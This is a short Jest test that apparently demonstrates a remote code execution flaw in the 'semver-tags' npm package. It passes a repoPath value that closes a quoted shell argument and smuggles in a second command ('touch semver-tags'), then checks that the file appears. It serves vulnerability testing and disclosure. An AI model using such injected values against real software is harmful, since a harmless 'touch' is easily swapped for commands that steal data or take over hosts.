test("Remote code execution for semver-tags", (done) => {
  const fs = require('fs');
  var r = require('semver-tags');

  var path = './semver-tags';
  if (fs.existsSync(path))
    fs.unlinkSync(path);

  var file_exist = fs.existsSync(path)
  expect(file_exist).toBe(false);

  opt = { "repoType": "git", "repoPath": "trovals/linux\"; touch semver-tags #" }
  r(opt, (out) => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, (err) => { done (); });
  });
})
